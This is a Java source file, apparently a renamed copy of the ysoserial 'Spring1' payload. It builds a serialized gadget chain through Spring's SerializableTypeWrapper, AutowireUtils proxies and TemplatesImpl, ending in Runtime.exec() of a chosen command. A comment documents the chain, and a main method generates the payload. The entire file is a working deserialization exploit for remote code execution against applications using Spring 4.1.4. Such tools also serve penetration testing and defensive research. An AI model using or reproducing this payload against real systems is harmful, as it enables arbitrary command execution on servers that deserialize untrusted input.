package mysocall.payloads;

import static java.lang.Class.forName;

import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Type;

import javax.xml.transform.Templates;

import org.springframework.beans.factory.ObjectFactory;

import mysocall.payloads.annotation.Authors;
import mysocall.payloads.annotation.Dependencies;
import mysocall.payloads.annotation.PayloadTest;
import mysocall.payloads.util.Gadgets;
import mysocall.payloads.util.JavaVersion;
import mysocall.payloads.util.PayloadRunner;
import mysocall.payloads.util.Reflections;

/*
	Gadget chain:

		ObjectInputStream.readObject()
			SerializableTypeWrapper.MethodInvokeTypeProvider.readObject()
				SerializableTypeWrapper.TypeProvider(Proxy).getType()
					AnnotationInvocationHandler.invoke()
						HashMap.get()
				ReflectionUtils.findMethod()
				SerializableTypeWrapper.TypeProvider(Proxy).getType()
					AnnotationInvocationHandler.invoke()
						HashMap.get()
				ReflectionUtils.invokeMethod()
					Method.invoke()
						Templates(Proxy).newTransformer()
							AutowireUtils.ObjectFactoryDelegatingInvocationHandler.invoke()
								ObjectFactory(Proxy).getObject()
									AnnotationInvocationHandler.invoke()
										HashMap.get()
								Method.invoke()
									TemplatesImpl.newTransformer()
										TemplatesImpl.getTransletInstance()
											TemplatesImpl.defineTransletClasses()
												TemplatesImpl.TransletClassLoader.defineClass()
													Pwner*(Javassist-generated).<static init>
														Runtime.exec()

 */

@SuppressWarnings({"rawtypes"})
@PayloadTest ( precondition = "isApplicableJavaVersion")
@Dependencies({"org.springframework:spring-core:4.1.4.RELEASE","org.springframework:spring-beans:4.1.4.RELEASE"})
@Authors({ Authors.FROHOFF })
public class Spring1 extends PayloadRunner implements ObjectPayload<Object> {

	public Object getObject(final String command) throws Exception {
		final Object templates = Gadgets.createTemplatesImpl(command);

		final ObjectFactory objectFactoryProxy =
				Gadgets.createMemoitizedProxy(Gadgets.createMap("getObject", templates), ObjectFactory.class);

		final Type typeTemplatesProxy = Gadgets.createProxy((InvocationHandler)
				Reflections.getFirstCtor("org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler")
					.newInstance(objectFactoryProxy), Type.class, Templates.class);

		final Object typeProviderProxy = Gadgets.createMemoitizedProxy(
				Gadgets.createMap("getType", typeTemplatesProxy),
				forName("org.springframework.core.SerializableTypeWrapper$TypeProvider"));

		final Constructor mitpCtor = Reflections.getFirstCtor("org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider");
		final Object mitp = mitpCtor.newInstance(typeProviderProxy, Object.class.getMethod("getClass", new Class[] {}), 0);
		Reflections.setFieldValue(mitp, "methodName", "newTransformer");

		return mitp;
	}

	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(Spring1.class, args);
	}

	public static boolean isApplicableJavaVersion() {
	    return JavaVersion.isAnnInvHUniversalMethodImpl();
    }
}
